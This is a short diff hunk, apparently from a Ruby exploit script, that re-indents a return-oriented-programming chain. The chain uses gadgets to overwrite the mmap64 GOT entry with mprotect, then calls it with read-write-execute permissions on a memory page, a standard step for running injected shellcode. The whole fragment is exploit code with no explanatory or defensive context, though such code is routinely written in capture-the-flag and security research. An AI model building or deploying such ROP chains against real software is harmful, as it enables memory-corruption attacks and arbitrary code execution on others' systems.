@@ -19,15 +19,15 @@ add_rdi_al = 0x00462de4
 
 # change mmap64 to mprotect, easier to find gadget
 $ropchain = [
-    poprax, 0x60,
-    poprdi, mmapgot,
-    add_rdi_al,
-    
-    poprax, mmapgot,
-    poprdx, 0x7,
-    poprsi, 0x1000,
-    poprdi, mmapaddr,
-    mmap64
+  poprax, 0x60,
+  poprdi, mmapgot,
+  add_rdi_al,
+
+  poprax, mmapgot,
+  poprdx, 0x7,
+  poprsi, 0x1000,
+  poprdi, mmapaddr,
+  mmap64
 ].pack(
   :uint64, :uint64,
   :uint64, :uint64,
